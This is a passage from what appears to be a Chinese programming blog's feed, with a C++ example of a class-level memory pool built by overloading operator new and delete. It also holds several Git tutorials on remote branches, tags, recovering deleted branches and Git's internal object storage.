class="literal">nullptr</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> Screen::screenChunk = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">int</span> Screen::isBusy = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *Screen::<span class="keyword">operator</span> <span class="title">new</span><span class="params">(<span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/// 处理继承体系中的 size 不同情况</span></span><br><span class="line">    <span class="keyword">if</span> (size != <span class="built_in"><span class="keyword">sizeof</span></span>(Screen))</span><br><span class="line">    &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;It is the derived obj!!!!\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> ::<span class="keyword">operator</span> <span class="built_in"><span class="keyword">new</span></span>(size);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">    Screen *p = freeStore;</span><br><span class="line">    <span class="keyword">if</span> (!p)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 内存池中的空间都分配完了，此处不作扩展所以直接报一个 assert，但是实际设计中这是不对的</span></span><br><span class="line">        <span class="built_in">assert</span>(isBusy != screenChunk &amp;&amp; <span class="string">&quot;memory pool is full!&quot;</span>);</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Get class Screen memory pool, the size is &quot;</span> &lt;&lt; screenChunk &lt;&lt; std::endl</span><br><span class="line">                  &lt;&lt; std::endl;</span><br><span class="line">        Screen *newBlocks = <span class="keyword">static_cast</span>&lt;Screen *&gt;(::<span class="keyword">operator</span> <span class="built_in"><span class="keyword">new</span></span>(screenChunk *size));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将分配好的空间块链接起来</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; screenChunk - <span class="number">1</span>; ++i)</span><br><span class="line">            newBlocks[i].next = &amp;newBlocks[i + <span class="number">1</span>];</span><br><span class="line">        <span class="comment">// 将最后一块的 next 置为空，这样当内存池都分配完了后</span></span><br><span class="line">        newBlocks[screenChunk - <span class="number">1</span>].next = <span class="literal">nullptr</span>;</span><br><span class="line">        p = newBlocks;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 记录第一空的闲置块</span></span><br><span class="line">        freeStore = &amp;newBlocks[<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        freeStore = freeStore-&gt;next;</span><br><span class="line"></span><br><span class="line">    ++isBusy;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;obtain a chunk from memory pool, the remaining size is &quot;</span> &lt;&lt; screenChunk - isBusy &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> Screen::<span class="keyword">operator</span> <span class="title">delete</span><span class="params">(<span class="keyword">void</span> *deadObj, <span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (deadObj == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="comment">/// 处理继承体系中的 size 不同情况</span></span><br><span class="line">    <span class="keyword">if</span> (size != <span class="built_in"><span class="keyword">sizeof</span></span>(Screen))</span><br><span class="line">    &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;It is the derived obj!!!!\n&quot;</span>;</span><br><span class="line">        ::<span class="function"><span class="keyword">operator</span> <span class="title">delete</span><span class="params">(deadObj)</span></span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Screen *readyToFree = <span class="keyword">static_cast</span>&lt;Screen *&gt;(deadObj);</span><br><span class="line">    readyToFree-&gt;next = freeStore;</span><br><span class="line">    freeStore = readyToFree;</span><br><span class="line">    --isBusy;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;give back a chunk to memory pool, the remaining size is &quot;</span> &lt;&lt; screenChunk - isBusy &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ScreenDerived</span> :</span> <span class="keyword">public</span> Screen</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">ScreenDerived</span>() : <span class="built_in">Screen</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>) &#123; std::cout &lt;&lt; <span class="string">&quot;ScreenDerived&#x27;s Ctor!!!\n&quot;</span>; &#125;</span><br><span class="line">    ~<span class="built_in">ScreenDerived</span>() &#123; std::cout &lt;&lt; <span class="string">&quot;ScreenDerived&#x27;s Dtor!!!\n&quot;</span>; &#125;</span><br><span class="line">    <span class="keyword">int</span> d;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Screen *p1 = <span class="keyword">new</span> <span class="built_in">Screen</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line">    Screen *p2 = <span class="keyword">new</span> <span class="built_in">Screen</span>(<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>);</span><br><span class="line">    Screen *p3 = <span class="keyword">new</span> ScreenDerived;</span><br><span class="line"></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;\n*************************************\n\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">delete</span> p1;</span><br><span class="line">    <span class="keyword">delete</span> p2;</span><br><span class="line">    <span class="keyword">delete</span> p3;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/********************************* output *********************************</span></span><br><span class="line"><span class="comment">Get class Screen memory pool, the size is 10</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">obtain a chunk from memory pool, the remaining size is 9</span></span><br><span class="line"><span class="comment">Screen&#x27;s Ctor!!!</span></span><br><span class="line"><span class="comment">obtain a chunk from memory pool, the remaining size is 8</span></span><br><span class="line"><span class="comment">Screen&#x27;s Ctor!!!</span></span><br><span class="line"><span class="comment">It is the derived obj!!!!</span></span><br><span class="line"><span class="comment">Screen&#x27;s Ctor!!!</span></span><br><span class="line"><span class="comment">ScreenDerived&#x27;s Ctor!!!</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*************************************</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Screen&#x27;s Dtor!!!</span></span><br><span class="line"><span class="comment">give back a chunk to memory pool, the remaining size is 9</span></span><br><span class="line"><span class="comment">Screen&#x27;s Dtor!!!</span></span><br><span class="line"><span class="comment">give back a chunk to memory pool, the remaining size is 10</span></span><br><span class="line"><span class="comment">ScreenDerived&#x27;s Dtor!!!</span></span><br><span class="line"><span class="comment">Screen&#x27;s Dtor!!!</span></span><br><span class="line"><span class="comment">It is the derived obj!!!!</span></span><br><span class="line"><span class="comment">**************************************************************************/</span></span><br></pre></td></tr></table></figure><p>以上的代码则展示了一个不成型的内存池，但是我们也主要是为了揭示上述 primitive 的用法，可以看到在第一次申请 Screen 对象的空间时，在其 operator new 函数中，会一次性申请 10*sizeof(Screen) 个字节的空间，然后由这个类自己来管理这块内存。同时这两个函数的重载也会被继承到子类中，在类的继承体系中，其子类所占空间大小是有可能大于父类的，所以在父类中实现的内存池不能直接用于其不同大小的子类对象，所以我们需要在其中用<strong>对象的大小</strong>来过滤掉子类对 operator new 函数和 operator delete 函数的调用。所以也可以注意到在 operator new 中有了第二个参数，这个参数就是为了保存刚刚析构的对象的大小的，只有通过这种方式才能过滤掉子类对来自父类的 operator delete 函数的调用。</p><blockquote><p>提出一个思考问题，如果我们将上述代码中 Screen 的析构函数不声明为虚函数，会发生什么情况呢？</p><p>提示：p3 指针是一个指向 ScreenDerived 空间的 Screen 类型指针，如果 Screen 的析构函数不是虚函数，则在 delete p3 的时候，编译器直接会用静态联编的方式让 p3 去调用 Screen 的析构函数，而且将 Screen 类型的大小作为 operator delete 的第二个参数。如果 Screen 的析构函数是虚函数，则在 delete p3 的时候，编译器会采用动态联编的方式，等到运行的时候再判定让 p3 调用 ScreenDerived 的析构函数，而且将 ScreenDerived 类型的大小作为 operator delete 的第二个参数。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GIT 远程仓库管理</title>
      <link href="/2021/10/23/tools-git-remote/"/>
      <url>/2021/10/23/tools-git-remote/</url>
      
        <content type="html"><![CDATA[<h3 id="关联本地仓库和远程仓库"><a href="#关联本地仓库和远程仓库" class="headerlink" title="关联本地仓库和远程仓库"></a>关联本地仓库和远程仓库</h3><p><strong>克隆远程仓库到本地</strong><br>假设你新加入一家公司，要参与到其中的某个项目中去，这时候在公司的代码仓库中已经有了这个项目，而你首先应该做的就是拉取该项目的镜像到本地进行开发。通过 <code>git clone</code> 命令，则可以简单的克隆一个远程项目到本地，不过要注意的是，远程仓库和本地仓库一定是完全一样的吗？其实不然，通过克隆的方式只会<strong>在本地创建一个与远程项目当前分支同名的本地分支</strong>，并且将本地分支和远程分支关联起来，如果远程仓库还有其他的分支，这些分支是不会同时在本地创建对应的本地分支的。</p><p><strong>本地仓库关联到远程</strong><br>假设你从零开始已经在本地开发完一个版本了，那么你需要将你的项目推送到远程仓库进行共享和保管，这时候你就需要在远程服务器上创建一个<strong>空</strong>的仓库，并且将自己的项目推送上去。通过命令则可以 <code>git remote add origin &lt;远程分支地址&gt;</code> 将本地仓库关联到远程仓库，同时对本地来说，对应远程仓库在本地的名字就是 <code>origin</code> ，默认我们一般都用这个名字，当然这是可选的，你可以使用任何你想要使用的名字。<strong>但是注意，即使通过以上命令已经将本地仓库关联到了远程仓库，但是本地分支是还没有和远程仓库分支有关联的！</strong></p><blockquote><p>[注]：其实远程仓库空不空都无所谓，因为正如我们所说，远程仓库和本地仓库是平等的关联关系，如果远程仓库不为空，只要保证本地和远程仓库的代码可以不冲突就行。</p></blockquote><h3 id="通过本地分支创建远程分支"><a href="#通过本地分支创建远程分支" class="headerlink" title="通过本地分支创建远程分支"></a>通过本地分支创建远程分支</h3><p>在将本地仓库和远程仓库关联后，远程仓库是可能没有我们本地分支的，这时候我们要想将本地分支推送到远程仓库中，在远程仓库就必须有一个分支和本地分支关联起来。通过 <code>git push -u &lt;远程仓库名&gt; &lt;本地分支名&gt;</code> 即可完成，这条命令在远程仓库创建一个与本地分支同名的分支，并且将本地仓库分支和远程仓库分支关联起来，同时将本地仓库中分支的内容推送到远程仓库分支！</p><blockquote><p>[注]：<code>-u</code> 等价于 <code>--set-upstream</code></p></blockquote><h3 id="通过远程分支创建本地分支"><a href="#通过远程分支创建本地分支" class="headerlink" title="通过远程分支创建本地分支"></a>通过远程分支创建本地分支</h3><p>有时候，可能远程仓库中有其他人提交的分支，如果我们需要接着这个分支继续开发，则需要从该分支创建出一个本地分支。有两种方式可以做到这点：</p><ul><li><code>git branch &lt;本地分支名&gt; &lt;远程仓库名&gt;/&lt;远程分支名&gt;</code>：根据远程仓库指定的分支创建本地分支，并且建立映射关系。</li><li><code>git fetch &lt;远程仓库名&gt; &lt;远程分支名&gt;:&lt;本地分支名&gt;</code>：根据远程仓库指定的分支创建本地分支，但不会建议映射关系。</li></ul><h3 id="分支映射关系的建立和解除"><a href="#分支映射关系的建立和解除" class="headerlink" title="分支映射关系的建立和解除"></a>分支映射关系的建立和解除</h3><p>任意的本地分支都可以和任意远程仓库中的分支建立映射关系，并没有规定名字必须一样等约束。通过在 <code>git push</code> 的时候加上-u 参数会自动建立关联关系，这样以后仅仅需要 <code>git push </code> 则可以默认推送到关联的分支。</p><ul><li><code>git branch --set-upstream-to=[远程仓库名]/&lt;远程分支名&gt;</code> ：关联本地分支到远程仓库的指定分支。</li><li><code>git branch --unset-upstream</code>：解除本地分支与远程分支的关联关系。</li></ul><h3 id="在推送代码前应该先拉取代码"><a href="#在推送代码前应该先拉取代码" class="headerlink" title="在推送代码前应该先拉取代码"></a>在推送代码前应该先拉取代码</h3><p>当我们基于远程仓库的某次提交记录进行开发后，需要将我们本地仓库推送到远程仓库，但是在推送之前，我们一般会先用 <code>git pull</code> 拉取远程仓库的代码，这是因为可能别人已经向远程仓库进行了提交，那我们在提交我们的代码前需要先把别人已经提交的代码拉取下来进行合并后再提交，而 <code>git pull</code> 就干了这么一件事。那 <code>git pull</code> 和 <code>git fetch</code> 有什么区别呢？</p><p><code>git fetch</code> 仅仅是将远程仓库的更新拉取到本地仓库，更新本地仓库中对远程仓库的引用等信息，同时会生成 <code>FETCH_HEAD</code> 文件保存对应远程分支的最新提交记录的 sha-1 值，作为我们后续的合并的依据，也就是说，<code>git fetch</code> 只拉取远程仓库的更新，而不会将其合并到本地。但 <code>git pull</code> 除了将远程仓库的更新拉取下来，还会自动进行合并操作，也就是将远程关联于本地当前分支的更新合并到本地分支，并且生成一次新的提交记录。这就相当于说，<code>git pull</code> 就等于 <code>git fetch</code> ＋ <code>git merge FETCH_HEAAD</code>。</p><p>一般来说，其实更推荐先用 <code>git fetch</code> 拉取更新，再用 <code>git merge</code> 其合并，因为这样我们可以考虑是否要将远程仓库的更新合并到我们本地！</p><h3 id="其他常用的命令"><a href="#其他常用的命令" class="headerlink" title="其他常用的命令"></a>其他常用的命令</h3><ul><li><code>git branch -r</code>：列出所有远程分支。</li><li><code>git branch -a</code>：列出所有分支。</li><li><code>git branch -vv</code>：列出本地分支和远程分支的映射信息。</li><li><code>git remote -v</code>：查看远程仓库的详细信息。</li><li><code>git remote show &lt;远程仓库名&gt;</code>：查看对应远程仓库的详细信息。</li><li><code>git push &lt;远程仓库名&gt; &lt;本地分支名&gt;:&lt;远程分支名&gt;</code>：将本地分支推送到指定远程仓库的远程分支上。</li><li><code>git push &lt;远程仓库名&gt; :&lt;远程分支名&gt;</code>：删除远程仓库中的指定分支（相当于推送一个空分支上去）。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 常用工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GIT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GIT 中如何打标签（git tag）</title>
      <link href="/2021/10/21/tools-git-tag/"/>
      <url>/2021/10/21/tools-git-tag/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在我们开发的过程中，可能经过多次 commit 提交才会确定一个版本，那么除了用 commit comments 来标识一次提交记录，还有没有什么更好的办法呢？GIT 为我们提供了标签这个功能，使用标签可以对某一次提交记录做上一个小标记，就像我们看书的时候，看到很有意思想要做个记号，可以用小的标签纸贴在那一页的边上，这让我们以后可以更方便的索引。</p><hr><h1 id="GIT-标签常用指令"><a href="#GIT-标签常用指令" class="headerlink" title="GIT 标签常用指令"></a>GIT 标签常用指令</h1><p>GIT 中的标签分为两种，一种是<strong>轻量标签</strong>（lightweight tag），一种是<strong>附注标签</strong>（annotated tag）。以下是一些常用的与标签相关的命令：</p><ul><li><code>git tag &lt;lightweght_name&gt;</code>：为当前分支所在的提交记录打上轻量标签。</li><li><code>git tag &lt;lightweght_name&gt; &lt;commit SHA-1 value&gt;</code>：为某次具体的提交记录打上轻量标签。</li><li><code>git tag -a &lt;anotated_name&gt; -m &lt;tag_message&gt;</code>：为当前分支所在的提交记录打上附注标签。</li><li><code>git tag</code>：列出所有的标签名。</li><li><code>git tag -d &lt;tag_name&gt;</code>：删除某个标签，本质上就是移除 <strong>.git/refs/tags/</strong> 中对应的文件。</li><li><code>git show &lt;tag_name&gt;</code>：显示标签对应提交记录的具体信息。</li><li><code>git push &lt;remote&gt; &lt;tag_name&gt;</code>：推送某个标签到远程仓库。</li><li><code>git push &lt;remote&gt; --tags</code>：推送所有标签到远程仓库。</li><li><code>git push &lt;remote&gt; --delete &lt;tag_name&gt;</code>：删除远程仓库中的某个标签。</li></ul><blockquote><p>[注]：标签与分支不相关。</p></blockquote><hr><h1 id="轻量标签"><a href="#轻量标签" class="headerlink" title="轻量标签"></a>轻量标签</h1><p>轻量标签的创建十分简单，使用命令 <code>git tag &lt;lightweight_name&gt;</code> 则会为当前所在的提交记录打上一个轻量标签。那么这个命令会发生什么呢？其实很简单，在使用这个命令后，会在 <strong>.git/refs/tags/</strong> 目录下生成一个以 <code>&lt;lightweight name&gt;</code> 为名字的文件，文件中存放了标签所对应提交记录的 commit 对象的 SHA-1 值。如下图所示：<br><img src="1.png"></p><p>假设我想为上述三个提交记录中的第一次提交打上版本 0 的标签，也是很容易做到的，同时使用 <code>git log</code> 命令时也会显示出标签的名称：<br><img src="2.png"></p><hr><h1 id="附注标签"><a href="#附注标签" class="headerlink" title="附注标签"></a>附注标签</h1><p>创建附注标签也非常简单，只要加上 <code>-a</code> 选项即可。同时还可以通过 <code>-m</code> 选项指定一条存储在标签中的信息，如果没有指定则 GIT 会打开编辑器要求你输入。假如我们为当前的提交记录打上一个附注标签，可以查看标签如下：<br><img src="3.png"></p><p><strong>附注标签同样也在 .git/refs/tags/ 目录下生成对应的文件，但是这个文件中不再存储该标签对应的 commit 对象的 SHA-1 值，而是存放了一个称为<font color=red> tag </font>对象的 SHA-1 值，这个 tag 对象中就存储了与这个附注标签相关的信息（包括打标签者的名字、电子邮件地址、日期时间、一个标签信息）和这个标签所对应的 commit 对象的 SHA-1 值。</strong> 我们可以查看如下：<br><img src="4.png"></p><hr><h1 id="远程仓库中的标签"><a href="#远程仓库中的标签" class="headerlink" title="远程仓库中的标签"></a>远程仓库中的标签</h1><p>我们想想标签文件所在的文件夹和其中保存的信息，是不是觉得其和分支很像？这使得他也有一个特点，就是在我们使用 <code>git push</code> 命令推送某个分支的时候，标签并不会被推送到远程仓库，<strong>所以我们必须显式的推送标签到远程仓库</strong>。</p><p>使用下面两种命令则可以推送标签到远程仓库：</p><ul><li><code>git push &lt;remote&gt; &lt;tag_name&gt;</code>：推送某个标签到远程仓库。</li><li><code>git push &lt;remote&gt; --tags</code>：推送所有标签到远程仓库。</li></ul><p>同样，在删除本地的标签后，要想删除远程仓库的标签，也必须使用的显式的命令：</p><ul><li><code>git push &lt;remote&gt; --delete &lt;tag_name&gt;</code>：删除远程仓库中的某个标签。</li><li><code>git push &lt;remote&gt; :refs/tags/&lt;tagname&gt;</code>：删除远程仓库某个标签的等价方式，相当于将冒号前面的空值推送到远程标签名，从而高效地删除它。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 常用工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GIT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GIT 如何恢复在没合并之前就删除的分支（detached HEAD）</title>
      <link href="/2021/10/21/tools-git-detached-head/"/>
      <url>/2021/10/21/tools-git-detached-head/</url>
      
        <content type="html"><![CDATA[<p>今天在一个分支上进行开发，费尽千辛万苦终于把功能实现了！！想着放下键盘去喝口水，但是等我水喝完回来，看到产品经理在操作我的电脑，这老哥居然一顿失误操作给我把刚刚开发完功能的分支删了！！我靠，我还没合并分支呢，给我把分支删了？？？？极其不讲武德，好在我把 GIT 玩得六，把分支给恢复回来了，不然这不是又要加班的节奏吗！！接下来就讨论一下怎么恢复没合并且被删除的分支。</p><hr><p>假设我当前 GIT 仓库的状态如下：<br><img src="1.png"></p><p>只有一个 master 分支，接下来我们创建并切换 dev 分支，并且在这个分支上进行开发然后提交：<br><img src="2.png"></p><p>这时候我们 GIT 仓库的状态如下：<br><img src="3.png"></p><p>OK 接下来我要模拟产品老哥的操作了，大家都让让！！！！<br><img src="4.png"></p><p>我靠，这老哥是真牛，第一下用 <code>-d</code> 选项被阻止了，他还给我强行删掉了，什么仇什么怨啊！还好我技术功底扎实，给老哥秀了一顿操作，把分支给救回来了。</p><p>1、首先，用命令 <code>git reflog</code> 来查看之前操作的历史记录：<br><img src="5.png"></p><p>注意，这时候如果我们直接用 <code>git log</code> 是看不到任何关于 dev 分支的信息的，但是通过 <code>git reflog</code> 可以看到我们在 dev 分支上提交时候的 commit 对象的 hash 值。</p><p>2、然后，用命令 <code>git checkout 5fdaaf7</code> 将 HEAD 指针指向对应的提交记录：<br><img src="6.png"></p><p>这是一种称为 detached HEAD 的操作，因为一般来说 HEAD 会指向某个分支，但是这种操作使得 HEAD 直接指向了某次 commit 。通过 <code>git log</code>，我们也可以看到当前跟 dev 相关的提交记录又出现了。</p><p>3、最后，在当前 HEAD 所在位置创建并切换分支 dev，则恢复了我们之前 dev 分支的状态：<br><img src="7.png"></p><p>大功告成！！！分支回来了，以前提交的记录都还在！！非常 nice，不同加班了！！</p><blockquote><p>通过上述的操作我们可以知道，即使我们用命令 <code>git branch -D</code> 删除一个分支，也仅仅是删除了一个分支指针而已，在分支下的提交记录其实是不会被删除的，仍然是可恢复的！！！</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 常用工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GIT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GIT 底层原理</title>
      <link href="/2021/10/21/tools-git-principle/"/>
      <url>/2021/10/21/tools-git-principle/</url>
      
        <content type="html"><![CDATA[<h1 id="git-仓库的初始化与配置信息"><a href="#git-仓库的初始化与配置信息" class="headerlink" title="git 仓库的初始化与配置信息"></a>git 仓库的初始化与配置信息</h1><p>通过 <code>git init</code> 可以创建一个 git 仓库，这应该也是所有学习 git 的程序员接触的第一条 git 命令了。通过在一个文件夹内运行此命令，则会在当前文件夹下生成一个 <strong>.git</strong> 的文件夹，将当前文件夹初始化为一个 git 仓库，同时该文件夹也是一个 git 仓库的唯一标识，而之后所有对仓库的操作结果都会存储在该文件夹中。如果你要备份或复制一个库，基本上将这一目录拷贝至其他地方就可以了。<br><img src="1.png"></p><p>git 中有三种配置文件，保存了 git 的配置信息：</p><ul><li><strong>/etc/gitconfig</strong> 文件：系统级别的配置文件。若使用 <code>git config</code> 时用 <code>--system</code> 选项，读写的就是这个文件。在系统安装好 git 后，系统中并不会自带该文件，需要使用 git 来进行配置才会生成该文件，示例如下：<br><img src="2.png"></li><li><strong>~/.gitconfig</strong> 文件：用户级别的配置文件。若使用 <code>git config</code> 时用 <code>--global</code> 选项，读写的就是这个文件。同理，在创建了用户后，用户目录中并不会自带该文件，需要使用 git 来配置才会生成，示例如下：<br><img src="3.png"></li><li><strong>.git/config</strong> 文件：项目级别的配置文件。在使用 <code>git config</code> 时默认就是修改项目级别的配置文件。不同于另外两种配置文件，项目级别的配置文件是在初始化仓库后就会自动生成，但是其中是不会有名称和邮箱信息的，示例如下：<br><img src="4.png"></li></ul><blockquote><p>[注]：在使用 git 进行提交的时候，需要从 ./.git/config 文件中读取提交者的姓名和邮箱，而一个新仓库的 ./.git/config 文件中是没有名称和邮箱信息的。所以 git 会向上搜索，即查找用户级别的配置文件 ~/.gitconfig，如果没有找到该文件或者该文件中没有需要的信息，则继续向上搜索，即查找系统级别的配置文件 /etc/gitconfig，如果还是没有找到需要的信息，则 git 会提示用户先输入配置信息，这也是为什么你每次在系统上装好 git 后第一次提交的时候会提示你告诉 git 你是谁！！！如下：<br><img src="5.png"></p></blockquote><p>使用 <code>git config --list</code> 命令可以列出所有的配置信息。在其中可能会看到一些重叠的变量，这是因为这个命令会将三种配置文件中所有的变量信息都列出来，但是其是有规律的，也就是<strong>从上到下依次是系统级、用户级和项目级</strong>，在使用这些变量的时候，会优先使用下面的变量。</p><hr><h1 id="git-add-一个文件到暂存区发生了什么"><a href="#git-add-一个文件到暂存区发生了什么" class="headerlink" title="git add 一个文件到暂存区发生了什么"></a>git add 一个文件到暂存区发生了什么</h1><p>在工作区编辑好一个文件，如果我们想将其纳入到 GIT 进行管理的话，首先要先用 <code>git add</code> 命令将其添加到<strong>暂存区</strong>，那么这个命令会发生什么呢？接下来通过一个示例讲解：</p><p>假设我们在上述的空 GIT 项目中添加一个文件，然后将其加入到暂存区：<br><img src="6.png"></p><p>可以看到在我们将 hello 文件通过 <code>git add</code> 命令将其加入到暂存区后，.git 文件夹中<strong>生成了两个新的文件</strong>，一个名为 index 的文件，一个文件名看起来像一串随机数的文件。那么，为什么会生成这些文件呢？这些文件的文件名和文件内容有什么特殊的含义吗？</p><ul><li><strong>先看 objects 文件夹下生成的文件：</strong><br>这个文件的文件名看起来像一串乱码，而且其上层目录还并不直接就是 objects 目录，而是一个两个字符的目录，这有什么规律呢？开门见山，我们先说结论！！！<strong>两个字符的目录名加上后续的长串文件名，代表了一个 hash 值，这个 hash 值是通过 sha-1 算法计算出来的；而在上述用 <code>git add</code> 添加工作区文件的时候，GIT 会将根据该所添加文件的内容生成一个称为<font color=red> blob 类型的对象，然后将该文件的内容、对象的类型和该文件内容长度</font>作为 sha-1 算法的输入，生成一个输出，这个输出就是上述 hash 值。而这个生成的 sha-1 文件里面又同时采用压缩算法保存了上述的标红的三个内容信息。</strong></li></ul><p>通过 <code>git cat-file</code> 命令则可以查看 sha-1 文件的相关信息：<br><img src="7.png"></p><p>分别通过 <code>-t</code>、<code>-p</code>、<code>-s</code> 选项，我们则可以看到刚刚生成的 sha-1 文件的代表的对象类型（blob，一种文件对象）、保存的文件内容和内容的大小（Hello GIT 是 9 个字符，但是其末尾还有一个换行符，所以是 10 个字符）。</p><blockquote><p>我们可以使用 <code>cat</code> 命令查看该 sha-1 文件中的内容，发现是一串乱码：<br><img src="8.png"><br>这是因为文件的内容已经采用 zlib 进行压缩存储，所以不是直接可读的文本文件了，我们可以采用 zlib 对其解压查看内容：<br><img src="9.png"><br>果然，该 sha-1 文件中保存了对象的类型（blob）、内容的大小（10）和保存的内容（Hello GIT\n）。同样，我们也知道了该 sha-1 文件的文件名是由其保存的内容通过 sha-1 算法生成的，也可以验证如下：<br><img src="10.png"><br>可以看到，用 python3 导入 hashlib 后对上述的内容计算后可以得到 sha-1 文件名对应的 hash 值。验证！！！</p></blockquote><ul><li><strong>再看 index 文件</strong>：<br>有没有想过在上述生成的 blob 对象中，并没有保存与文件名相关的信息，而仅仅保存了内容信息，那么 GIT 总是需要文件名信息的吧，不然怎么识别哪个文件已经暂存，哪个没有呢？？OK，我们也先说结论。正如上述所说，还生成了一个 index 文件呀，而<strong>文件名信息都保存在了 index 文件中</strong>。</li></ul><p>通过 <code>git ls-files</code> 命令则可以查看 index 文件中的内容：<br><img src="11.png"></p><p>可以看到，通过该命令可以知道 index 中保存了 hello 文件名，同时还有其对应的 sha-1 文件的 sha-1 值。</p><p>根据以上讨论，如果我们再向暂存区中添加一个 bye 文件，则 GIT 也会为这个 bye 文件生成一个 blob 对象保存内容，同时在 index 文件中加入 bye 文件的文件名信息。<br><img src="12.png"></p><p>注意，没有添加的暂存区中的文件，是不会被 index 记录的！！</p><p>如果我们修改 bye 文件，那么工作区中的 bye 文件则和暂存区中的不一样了，<strong>那么 GIT 是怎么知道工作区和暂存区中文件的差异的呢？</strong> 其实他就是将工作区中的文件计算 sha-1 值后与暂存区中的比对，如果不同，则文件被标识为<strong>已修改</strong>状态，如果 index 文件中都没有这个文件的记录，则文件都没有被加入到暂存区，则文件被标记为<strong>未追踪</strong>状态。</p><p>如果将这个修改后的 bye 文件再次添加到暂存区，根据之前的理解，内容变了，肯定又要新生成一个 sha-1 文件来保存这次更新，那么上次 bye 未提交的 blob 对象会被删除吗？？通过命令查看，发现其并没有被删除，那这应该是一个垃圾 blob 对象文件了。<br><img src="13.png"></p><p>index 文件也会被更新，其中对 bye 文件中对其 blob 对象记录被更新到刚刚生成的那个。<br><img src="14.png"></p><ul><li><strong>总结：</strong> 在执行 <code>git add</code> 命令后，GIT 会为文件生成一个 blob 对象（sha-1 文件），这个对象的名字完全由添加文件的内容所决定，通过 sha-1 算法计算出对象的名字，对象中保存的内容包括<strong>对象的类型</strong>、<strong>添加文件的内容</strong>和<strong>文件内容大小</strong>。而添加文件的名称信息则记录在 index 文件中，index 文件的信息可以通过 <code>git ls-files -s</code> 命令来查看，同时还能看出文件名到暂存区中文件当前的 blob 对象的映射关系。</li></ul><hr><h1 id="git-commit-背后发生的事"><a href="#git-commit-背后发生的事" class="headerlink" title="git commit 背后发生的事"></a>git commit 背后发生的事</h1><p>在将文件添加到<strong>暂存区</strong>后，我们需要用 <code>git commit</code> 命令将其提交到 GIT 仓库进行版本管理，那么运行 <code>git commit</code> 命令会发生什么呢？上述 <code>git add</code> 命令将文件添加到暂存区的时候为每个文件生成了一个 blob 对象，那 commit 也会为每个文件生成 blob 对象吗？或者说还是生成其他类型的对象呢？我们接下来讨论 <code>git commit</code> 背后发生的事！！</p><p>为了更好的阐述 <code>git commit</code> 的原理，我们对上述的 GIT 项目修改，在上述两个文件 hello 和 bye 都添加到暂存区的基础上，创建一个目录 process，同时在该目录下创建一个文件 working，并将其添加到暂存区。如下所示：<br><img src="15.png"></p><p>可以看到，GIT 为 process/working 文件也生成了一个 blob 对象。用 <code>git ls-files -s</code> 查看 index 中记录的暂存区的文件名等信息：<br><img src="16.png"></p><p>可以发现对于 working 文件，不仅仅记录其文件名，<strong>还记录了其相对路径</strong>。</p><p>接下来我们通过 <code>git commit -m &quot;first commit&quot;</code> 来提交暂存区中的内容，查看生成的文件：<br><img src="17.png"></p><p>可以看到在 objects 文件夹下生成了三个新的文件，我们先用 <code>git cat-file</code> 查看红色框那个文件：<br><img 